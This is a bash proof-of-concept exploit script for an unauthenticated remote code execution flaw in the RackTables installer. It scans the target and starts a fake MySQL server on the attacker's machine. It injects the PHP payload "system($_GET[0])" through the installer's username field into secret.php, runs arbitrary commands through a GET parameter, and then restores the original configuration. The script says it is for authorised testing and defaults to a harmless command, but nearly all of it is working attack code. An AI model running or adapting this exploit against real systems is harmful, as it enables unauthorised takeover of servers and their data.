#!/usr/bin/env bash
# =============================================================================
# RackTables unauthenticated RCE — one-command PoC from the attacker machine (generic: any target + remote restore)
#
# Usage:
#   ./poc.sh <target>                                   # target in the form host:port / http://host/path
#   ./poc.sh 10.0.0.5:8080 --attacker-ip 192.168.1.50
#   ./poc.sh 10.0.0.5:8080 --restore-file /path/TargetA-secret.php
#   ./poc.sh 10.0.0.5:8080 --restore-db 'rt_user:pass@127.0.0.1:3306/racktables_db'
#   ./poc.sh 10.0.0.5:8080 --cmd 'id'
#
# Attacker -> victim, 8 steps:
#   0. Environment check (curl / python3 / mysql-mimic)
#   1. Recon the target (401 / installer reachable without authentication)
#   2. Non-destructive check whether secret.php is writable (POST points to 127.0.0.1:1, it must fail and nothing is written)
#   3. Start a "fake MySQL" on the attacker machine (accepts any username/password, no real DB needed) as the attacker database
#   4. Choose the restore source: first look in backups/ for the target's original secret.php that the user placed there, use secret-init.php only if there is none
#   5. Unauthenticated injection into secret.php
#   6. Verify with a harmless command (default echo PWN-<nonce>)
#   7. Remote restore: write the original DSN back through the unauthenticated installer (optional byte-level overwrite through the RCE channel)
#   8. Summary
#
# Where to place the restore source (prepared by the user, put under backups/ in this directory):
#   ./backups/<target IP>_<port>_secret.php     e.g. backups/10.0.0.5_8080_secret.php
#   ./backups/<target IP>_secret.php            e.g. backups/10.0.0.5_secret.php
#   A file name that merely contains the target IP is also recognised; when backups/ holds only one usable file, that file is taken.
#   No matching file in backups/ -> fall back to secret-init.php in this directory (lab baseline snapshot).
#   --restore-file / --restore-db have the highest priority when given explicitly; --secret-path sets the remote secret.php path;
#   --no-docroot declares that the attacker machine cannot see the victim's file system (skips local probing and the local fallback).
#
# Restore principle (important):
#   The installer writes with fopen('w+') and truncates directly, so the original secret.php is neither backed up nor kept;
#   therefore "restore" = write the target DSN back with the original configuration the attacker holds, it cannot be read back from the target.
#   Channel 1 (default, generic): POST the unauthenticated installer -> the original DSN is written back and the site is usable again.
#   Channel 2 (optional): --secret-path or an automatic find, then a byte-level overwrite via base64 using the command execution just obtained.
#   Channel 3 (local only): --docroot points to the target directory visible on the attacker machine, then a direct cp + verification.
#   When there is no restore source at all: destructive injection is refused by default (non-destructive check only), --force is needed to run it anyway.
#
# Exit codes: 0 = verified and restored; 1 = something failed; 2 = usage/environment error or refused to run
# For authorised testing only; only harmless commands are executed by default.
# =============================================================================
set -u

POC_DIR="$(cd "$(dirname "$0")" && pwd)"
FAKE_DB="$POC_DIR/fake_mysql_any.py"
BACKUP_DIR="$POC_DIR/backups"
DB_PORT=3308
CMD=''
DOCROOT=''
RESTORE_DB=''
RESTORE_FILE=''
SECRET_PATH=''
ATTACKER_IP_OVERRIDE=''
KEEP_DB=0
FORCE=0
NO_DOCROOT=0

red()   { printf '\033[31m%s\033[0m\n' "$*"; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
gray()  { printf '\033[90m%s\033[0m\n' "$*"; }
cyan()  { printf '\033[36m%s\033[0m\n' "$*"; }
yellow(){ printf '\033[33m%s\033[0m\n' "$*"; }
step()  { printf '\n\033[36m[%s] %s\033[0m\n' "$1" "$2"; }

cleanup() { [ "${KEEP_DB:-0}" -eq 0 ] && pkill -f fake_mysql_any.py 2>/dev/null; return 0; }
trap cleanup EXIT

usage() {
    awk 'NR>1 && /^#/ {sub(/^# ?/,""); print; next} NR>1 {exit}' "$0"
    exit 2
}

# ---------- arguments ----------
TARGET=''
while [ $# -gt 0 ]; do
    case "$1" in
        --cmd)          CMD="$2"; shift 2 ;;
        --db-port)      DB_PORT="$2"; shift 2 ;;
        --docroot)      DOCROOT="$2"; shift 2 ;;
        --restore-db)   RESTORE_DB="$2"; shift 2 ;;
        --restore-file) RESTORE_FILE="$2"; shift 2 ;;
        --secret-path)  SECRET_PATH="$2"; shift 2 ;;
        --attacker-ip)  ATTACKER_IP_OVERRIDE="$2"; shift 2 ;;
        --keep-db)      KEEP_DB=1; shift ;;
        --no-docroot)   NO_DOCROOT=1; shift ;;
        --force)        FORCE=1; shift ;;
        -h|--help)      usage ;;
        *)              TARGET="$1"; shift ;;
    esac
done
[ -z "$TARGET" ] && usage
[ -z "$CMD" ] && CMD="echo PWN-$(tr -dc 'a-f0-9' </dev/urandom | head -c 8)"

# Normalise the URL
case "$TARGET" in
    http://*|https://*) ;;
    *) TARGET="http://$TARGET" ;;
esac
TARGET="${TARGET%/}"
HOSTPORT="${TARGET#*://}"; HOSTPORT="${HOSTPORT%%/*}"
HOST="${HOSTPORT%%:*}"
PORT=''
case "$HOSTPORT" in *:*) PORT="${HOSTPORT##*:}" ;; esac

ATTACKER_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
[ -n "$ATTACKER_IP_OVERRIDE" ] && ATTACKER_IP="$ATTACKER_IP_OVERRIDE"
[ -z "$ATTACKER_IP" ] && { red 'Cannot determine the attacker IP (use --attacker-ip to specify it)'; exit 2; }

# When the target is "loopback on this machine", the attacker machine would reach itself instead of the victim
if [ "$HOST" = "localhost" ] || [ "$HOST" = "127.0.0.1" ] || [ "$HOST" = "::1" ]; then
    GW="$(ip route 2>/dev/null | awk '/^default/{print $3; exit}')"
    red "!! The target is written as localhost, which on the attacker machine points to the attacker itself and cannot reach the victim."
    gray "   Please use a reachable address of the victim (usually the default gateway $GW), e.g.: $0 http://$GW:8300"
    exit 2
fi

# Probe automatically only when the attacker machine happens to see the target directory (shared file system / the target is this machine)
if [ -z "$DOCROOT" ] && [ "$NO_DOCROOT" -ne 1 ]; then
    for d in /var/www/html/racktables /var/www/racktables/wwwroot \
             /mnt/e/zcode/data/CVE/env/wwwroot /mnt/e/zcode/data/CVE/repro/main/wwwroot; do
        if [ -f "$d/inc/secret.php" ] && grep -q 'pdo_dsn' "$d/inc/secret.php" 2>/dev/null; then
            DOCROOT="$d"; break
        fi
    done
fi

# ---------- small helpers ----------
PASS=0; FAIL=0
ok()   { green "   PASS  $*"; PASS=$((PASS+1)); }
bad()  { red   "   FAIL  $*"; FAIL=$((FAIL+1)); }
note() { gray  "   $*"; }

INST_URL="$TARGET/index.php?module=installer"

# Read DSN / username / password out of a RackTables secret.php
parse_secret() {
    local f="$1"
    D_DSN="$(awk -F"'" '/^[ \t]*[$]pdo_dsn[ \t]*=/{print $2; exit}' "$f")"
    D_USER="$(awk -F"'" '/^[ \t]*[$]db_username[ \t]*=/{print $2; exit}' "$f")"
    D_PASS="$(awk -F"'" '/^[ \t]*[$]db_password[ \t]*=/{print $2; exit}' "$f")"
    [ -n "$D_DSN" ]
}

# DSN -> installer form fields
dsn_split() {
    local dsn="$1" body="${1#mysql:}"
    D_CONN=conn_tcp; D_HOST=''; D_PORT=''; D_SOCK=''; D_DB=''
    case "$dsn" in
        mysql:unix_socket=*) D_CONN=conn_unix
            D_SOCK="$(printf '%s' "$body" | sed -n 's/.*unix_socket=\([^;]*\).*/\1/p')" ;;
        mysql:*)             D_HOST="$(printf '%s' "$body" | sed -n 's/.*host=\([^;]*\).*/\1/p')"
                             D_PORT="$(printf '%s' "$body" | sed -n 's/.*port=\([^;]*\).*/\1/p')" ;;
    esac
    D_DB="$(printf '%s' "$body" | sed -n 's/.*dbname=\([^;]*\).*/\1/p')"
    [ -z "$D_PORT" ] && D_PORT=3306
}

# Write the given DSN/account back into the target secret.php through the unauthenticated installer (remote restore channel 1)
installer_writeback() {
    local conn="$1" host="$2" port="$3" sock="$4" db="$5" user="$6" pass="$7"
    curl -sk --max-time 20 -X POST \
        --data-urlencode 'step=3' \
        --data-urlencode 'save_config=1' \
        --data-urlencode "conn=$conn" \
        --data-urlencode "mysql_host=$host" \
        --data-urlencode "mysql_port=$port" \
        --data-urlencode "mysql_socket=$sock" \
        --data-urlencode "mysql_db=$db" \
        --data-urlencode "mysql_username=$user" \
        --data-urlencode "mysql_password=$pass" \
        "$INST_URL"
}

# Run one command through the command execution already obtained (used by remote restore channel 2)
rce_run() {
    curl -sk --max-time 25 --get --data-urlencode 'module=installer' --data-urlencode "0=$1" "$TARGET/index.php"
}

# Pick the original secret.php belonging to this target out of backups/
pick_backup() {
    local host="$1" port="$2" f name hit='' cnt=0 only=''
    [ -d "$BACKUP_DIR" ] || return 1
    # 1) exact match on the "IP_port / IP" naming
    for name in "${host}_${port}_secret.php" "${host}_secret.php" "${host}.secret.php" \
                "${host}_${port}.php" "${host}.php" \
                "${host}_${port}_secret.bak" "${host}_secret.bak" "${host}.bak"; do
        [ -z "$port" ] && case "$name" in *"$host"_"") continue ;; esac
        if [ -f "$BACKUP_DIR/$name" ]; then hit="$BACKUP_DIR/$name"; break; fi
    done
    # 2) file name contains the target IP
    if [ -z "$hit" ]; then
        for f in "$BACKUP_DIR"/*.php "$BACKUP_DIR"/*.bak; do
            [ -f "$f" ] || continue
            case "$(basename "$f")" in *"$host"*) hit="$f"; break ;; esac
        done
    fi
    # 3) the only usable file in backups/ (single-target scenario)
    if [ -z "$hit" ]; then
        for f in "$BACKUP_DIR"/*.php "$BACKUP_DIR"/*.bak; do
            [ -f "$f" ] || continue
            grep -q 'pdo_dsn' "$f" 2>/dev/null || continue
            cnt=$((cnt+1)); only="$f"
        done
        [ "$cnt" -eq 1 ] && hit="$only"
    fi
    [ -n "$hit" ] && printf '%s' "$hit" && return 0
    return 1
}

cyan "RackTables unauthenticated RCE — attacker machine PoC (generic target + remote restore)"
echo "   victim      : $TARGET"
echo "   attacker    : $ATTACKER_IP"
echo "   harmless cmd: $CMD"
echo "   attacker DB : $ATTACKER_IP:$DB_PORT (fake MySQL, accepts any username/password)"

# ---------- 0. Environment check ----------
step 0 'Environment check'
command -v curl    >/dev/null || { red 'curl is missing'; exit 2; }
command -v python3 >/dev/null || { red 'python3 is missing'; exit 2; }
python3 -c 'import mysql_mimic' 2>/dev/null || { red 'mysql-mimic is missing, run first: pip3 install --break-system-packages mysql-mimic'; exit 2; }
[ -f "$FAKE_DB" ] || { red "Cannot find $FAKE_DB (it should be in the same directory as this script)"; exit 2; }
note 'curl / python3 / mysql-mimic ready'

# ---------- 1. Recon ----------
step 1 'Recon (no credentials)'
ROOT_CODE="$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 "$TARGET/")"
if [ "$ROOT_CODE" = "000" ]; then
    bad "Victim unreachable ($TARGET)"
    gray "   Troubleshooting: the service must listen on 0.0.0.0; the Windows firewall + Hyper-V firewall must allow the port"
    exit 1
fi
note "GET / -> $ROOT_CODE"
INST="$(curl -sk --max-time 10 "$INST_URL")"
if printf '%s' "$INST" | grep -q 'RackTables installation'; then
    ok 'Installer page reachable without authentication (RackTables installation)'
else
    bad 'No RackTables installer page found (not RackTables? or the installer has been taken offline)'
    exit 1
fi
printf '%s' "$INST" | grep -q 'Your configuration file exists' && note 'Status: secret.php exists (already installed)'
printf '%s' "$INST" | grep -q 'no existing installation'     && note 'Status: not installed (installer window)'

# ---------- 2. Non-destructive writability check ----------
step 2 'Non-destructive check: is secret.php writable'
PROBE="$(curl -sk --max-time 10 -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'step=3&save_config=1&conn=conn_tcp&mysql_host=127.0.0.1&mysql_port=1&mysql_db=x&mysql_username=x&mysql_password=x' \
  "$INST_URL")"
if printf '%s' "$PROBE" | grep -q 'Database connection failed'; then
    ok 'Writable (the probe DSN cannot connect, nothing was written to disk)'
elif printf '%s' "$PROBE" | grep -q 'not writable'; then
    bad 'secret.php is not writable (already hardened), injection is not possible'
    echo ""
    cyan "Conclusion: the target is hardened, the unauthenticated RCE does not hold"
    exit 1
else
    bad 'Writability check failed (no signature in the response)'
    exit 1
fi

# ---------- 4. Prepare the restore source ----------
step 4 'Prepare the restore source (backups/ first, then secret-init.php)'
BACKUP=''
RESTORE_KIND=''
D_DSN=''; D_USER=''; D_PASS=''
LAB_SECRET="$POC_DIR/secret-init.php"

if [ -n "$RESTORE_FILE" ]; then
    if [ ! -f "$RESTORE_FILE" ]; then bad "Restore source file does not exist: $RESTORE_FILE"; exit 2; fi
    BACKUP="$RESTORE_FILE"
    if ! parse_secret "$BACKUP"; then bad "Cannot parse \$pdo_dsn from $BACKUP (not a RackTables secret.php?)"; exit 2; fi
    ok "Restore source: --restore-file $BACKUP ($(stat -c%s "$BACKUP") bytes)"
    RESTORE_KIND='file'
elif [ -n "$RESTORE_DB" ]; then
    case "$RESTORE_DB" in
        *@*/*)
            D_USER="${RESTORE_DB%%@*}"
            _hp="${RESTORE_DB#*@}"; _hp="${_hp%%/*}"
            D_PASS="${D_USER#*:}"; D_USER="${D_USER%%:*}"
            D_DSN="mysql:host=${_hp%%:*};port=${_hp##*:};dbname=${RESTORE_DB##*/}" ;;
        *)
            D_DSN="mysql:host=$(printf '%s' "$RESTORE_DB" | cut -d: -f1);port=$(printf '%s' "$RESTORE_DB" | cut -d: -f2);dbname=$(printf '%s' "$RESTORE_DB" | cut -d: -f3)"
            D_USER="$(printf '%s' "$RESTORE_DB" | cut -d: -f4)"
            D_PASS="$(printf '%s' "$RESTORE_DB" | cut -d: -f5)" ;;
    esac
    ok "Restore source: --restore-db $D_DSN (user=$D_USER)"
    RESTORE_KIND='db'
elif BACKUP="$(pick_backup "$HOST" "$PORT")" && [ -n "$BACKUP" ]; then
    if ! parse_secret "$BACKUP"; then bad "$BACKUP in backups/ has no parsable \$pdo_dsn"; exit 2; fi
    ok "Restore source: target snapshot in backups/ $BACKUP ($(stat -c%s "$BACKUP") bytes, DSN=$D_DSN)"
    RESTORE_KIND='file'
elif [ -f "$LAB_SECRET" ]; then
    BACKUP="$LAB_SECRET"
    parse_secret "$BACKUP" || { bad "Cannot parse $LAB_SECRET"; exit 2; }
    ok "Restore source: no match in backups/, falling back to secret-init.php ($(stat -c%s "$BACKUP") bytes, DSN=$D_DSN)"
    yellow "   !! secret-init.php is the lab baseline shipped with the package. If the victim is not that lab, put its original secret.php into backups/"
    case "$D_DSN" in
        *host=127.0.0.1*|*host=localhost*|*unix_socket=*)
            yellow "   !! This DSN points to the loopback / local socket: writing it back is safe only if the victim host really has this database,"
            yellow "      otherwise the site breaks (it cannot reach the DB). For a real target always provide its own secret.php." ;;
    esac
    RESTORE_KIND='file'
elif [ -n "$DOCROOT" ] && [ -f "$DOCROOT/inc/secret.php" ]; then
    mkdir -p "$BACKUP_DIR"
    BACKUP="$BACKUP_DIR/${HOST}_${PORT}_secret.php"
    cp "$DOCROOT/inc/secret.php" "$BACKUP"
    parse_secret "$BACKUP" || { bad "Cannot parse the backed-up secret.php"; exit 2; }
    ok "Restore source: target secret.php visible on the attacker machine, saved to $BACKUP"
    RESTORE_KIND='file'
else
    RESTORE_KIND='none'
    yellow "   No restore source at all: after injection the original DSN is lost forever and the target site can no longer reach its original DB."
    gray   "   The installer writes secret.php with fopen('w+'), truncating directly, without backup and without keeping the original configuration,"
    gray   "   so the attacker must hold this target's original DSN or a secret.php snapshot before acting."
    gray   "   How to: put the target's original secret.php into backups/${HOST}_${PORT}_secret.php"
    gray   "           or use --restore-file <file> / --restore-db 'user:pass@host:port/db'"
    if [ "$FORCE" -ne 1 ]; then
        echo ""
        red 'Refusing to run the destructive injection (no restore source provided). Add --force if you really want to run it.'
        exit 2
    fi
    yellow '   --force given: injection continues, but no restore will be performed.'
fi

if [ -n "$RESTORE_KIND" ] && [ "$RESTORE_KIND" != 'none' ]; then
    dsn_split "$D_DSN"
    if [ "$D_CONN" = 'conn_unix' ]; then
        note "Restore channel: unauthenticated installer write-back (socket=$D_SOCK, db=$D_DB, user=$D_USER)"
    else
        note "Restore channel: unauthenticated installer write-back (host=$D_HOST:$D_PORT, db=$D_DB, user=$D_USER)"
    fi
    note 'The victim only has to be able to reach this DB itself; the attacker machine needs no access to the target file system'
fi

# ---------- 3. Start the attacker database ----------
step 3 'Start the attacker database (fake MySQL inside the attacker machine)'
if ss -lnt 2>/dev/null | grep -q ":$DB_PORT "; then
    ok "Fake MySQL is already listening on $DB_PORT"
else
    pkill -f fake_mysql_any.py 2>/dev/null
    nohup python3 "$FAKE_DB" "$DB_PORT" >/tmp/poc_fake_mysql.log 2>&1 &
    disown
    for _ in $(seq 1 20); do
        ss -lnt 2>/dev/null | grep -q ":$DB_PORT " && break
        sleep 0.2
    done
    if ss -lnt 2>/dev/null | grep -q ":$DB_PORT "; then
        ok "Fake MySQL started (0.0.0.0:$DB_PORT)"
    else
        bad 'Fake MySQL failed to start (see /tmp/poc_fake_mysql.log)'
        exit 1
    fi
fi
note "The victim's PDO must be able to actively connect to $ATTACKER_IP:$DB_PORT (reverse connectivity is a hard requirement)"

# ---------- 5. Unauthenticated injection ----------
step 5 'Unauthenticated injection (no credentials at all)'
INJ="$(curl -sk --max-time 20 -X POST \
  --data-urlencode 'step=3' \
  --data-urlencode 'save_config=1' \
  --data-urlencode 'conn=conn_tcp' \
  --data-urlencode "mysql_host=$ATTACKER_IP" \
  --data-urlencode "mysql_port=$DB_PORT" \
  --data-urlencode 'mysql_db=pwn' \
  --data-urlencode "mysql_username=x'; system(\$_GET[0]); //" \
  --data-urlencode 'mysql_password=whatever' \
  "$INST_URL")"
if printf '%s' "$INJ" | grep -q 'written successfully'; then
    ok 'Write succeeded: secret.php has been injected'
else
    bad 'Write failed (can the victim reach the attacker MySQL? check --attacker-ip / --db-port / the network)'
    printf '%s' "$INJ" | grep -q 'Database connection failed' && note "Response: Database connection failed -> the victim cannot connect to $ATTACKER_IP:$DB_PORT"
    exit 1
fi

# ---------- 6. Harmless command verification ----------
step 6 'Verify command execution (harmless command)'
RESP="$(rce_run "$CMD")"
FIRST="$(printf '%s' "$RESP" | head -1 | tr -d '\r')"
if printf '%s' "$RESP" | grep -qF "$CMD"; then
    ok "RCE confirmed: command echoed [$FIRST]"
else
    if [ -n "$FIRST" ] && ! printf '%s' "$FIRST" | grep -q '^<'; then
        ok "RCE confirmed: command output [$FIRST]"
    else
        bad 'No command output obtained (it may have been swallowed by the 401 error page; try again with another --cmd)'
    fi
fi
WHO="$(rce_run 'whoami' | head -1 | tr -d '\r')"
[ -n "$WHO" ] && ! printf '%s' "$WHO" | grep -q '^<' && note "whoami -> $WHO"

# ---------- 7. Remote restore + re-check ----------
step 7 'Restore secret.php remotely and re-check'
RESTORED=0
if [ "$RESTORE_KIND" = 'none' ]; then
    note 'No restore source: skipping the restore (--force mode), the target needs manual repair'
else
    RR="$(installer_writeback "$D_CONN" "$D_HOST" "$D_PORT" "$D_SOCK" "$D_DB" "$D_USER" "$D_PASS")"
    if printf '%s' "$RR" | grep -q 'written successfully'; then
        ok 'secret.php written back with the original configuration through the unauthenticated installer (target DSN restored)'
        RESTORED=1
    else
        bad 'Remote write-back failed (can the victim reach the original DB? is the original DSN still valid?)'
        printf '%s' "$RR" | grep -q 'Database connection failed' && note 'Response: Database connection failed -> the original DB parameters are unusable'
    fi

    # Optional: byte-level overwrite through the command execution just obtained (without relying on any target file system access)
    if [ "$RESTORED" -eq 1 ] && [ -n "$BACKUP" ] && [ -f "$BACKUP" ]; then
        if [ -z "$SECRET_PATH" ]; then
            FOUND="$(rce_run 'timeout 12 find / -name secret.php -path "*/inc/*" -not -path "/proc/*" 2>/dev/null | head -2' | tr -d '\r')"
            SECRET_PATH="$(printf '%s' "$FOUND" | head -1)"
        fi
        if [ -n "$SECRET_PATH" ] && printf '%s' "$SECRET_PATH" | grep -q '^/'; then
            note "Target secret.php path: $SECRET_PATH"
            rce_run "printf '' > '$SECRET_PATH'" >/dev/null 2>&1
            B64="$(base64 -w0 < "$BACKUP")"
            i=0; n=${#B64}; CH=800
            while [ $i -lt $n ]; do
                rce_run "printf %s '${B64:$i:$CH}' | base64 -d >> '$SECRET_PATH'" >/dev/null 2>&1
                i=$((i+CH))
            done
            LOCAL_H="$(sha256sum "$BACKUP" | awk '{print $1}')"
            REMOTE_H="$(rce_run "sha256sum '$SECRET_PATH'" | awk '{print $1}' | tr -d '\r')"
            if [ "$LOCAL_H" = "$REMOTE_H" ]; then
                ok 'Byte-level overwrite succeeded (remote SHA256 matches the restore source)'
            else
                note "Byte-level overwrite did not succeed (remote ${REMOTE_H:-no echo}), the installer write-back is the fallback"
            fi
        else
            note 'Target secret.php path not located (use --secret-path to specify it), the installer write-back is the fallback'
        fi
    fi

    # Channel 3: byte-level verification/fallback only when the attacker machine can see the target directory
    if [ -n "$DOCROOT" ] && [ -f "$DOCROOT/inc/secret.php" ] && [ -n "$BACKUP" ] && [ -f "$BACKUP" ]; then
        cp "$BACKUP" "$DOCROOT/inc/secret.php"
        H1="$(sha256sum "$DOCROOT/inc/secret.php" | awk '{print $1}')"
        H2="$(sha256sum "$BACKUP" | awk '{print $1}')"
        [ "$H1" = "$H2" ] && ok 'Locally visible directory restored byte for byte (SHA256 matches)' || bad 'Hash mismatch after restoring the locally visible directory'
        RESTORED=1
    fi
fi

if [ "$RESTORED" -eq 1 ]; then
    AFTER="$(rce_run "$CMD")"
    if printf '%s' "$AFTER" | grep -q '^<'; then
        ok 'Re-check: the command line is gone (no longer executed)'
    else
        bad 'Re-check: the command still executes (restore did not take effect?)'
    fi
    NEWCODE="$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 "$TARGET/")"
    [ "$NEWCODE" = "$ROOT_CODE" ] && ok "Business status unchanged (GET / -> $NEWCODE)" || bad "Business status changed ($ROOT_CODE -> $NEWCODE)"
    INST2="$(curl -sk --max-time 10 "$INST_URL")"
    printf '%s' "$INST2" | grep -q 'Your configuration file exists' && ok 'Re-check: the installer reports that the configuration exists (secret.php is valid)' \
        || note 'Re-check: the installer status did not return to "installed" (template difference, usually does not affect login)'
else
    note 'Not restored: the target needs manual repair (put the snapshot into backups/ and rerun to restore)'
fi

# ---------- 8. Summary ----------
echo ""
cyan "========== Result =========="
echo "Passed $PASS / Failed $FAIL"
echo ""
if [ "$FAIL" -eq 0 ]; then
    if [ "$RESTORED" -eq 1 ]; then
        green "Conclusion: the unauthenticated RCE holds and the target secret.php has been restored remotely."
    else
        green "Conclusion: the unauthenticated RCE holds (--force mode, not restored, please repair manually)."
    fi
else
    red "Conclusion: some items failed, see the output above."
fi
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
